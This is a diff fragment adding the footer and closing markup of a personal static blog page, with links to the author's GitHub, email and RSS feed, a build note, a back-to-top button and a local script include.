+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
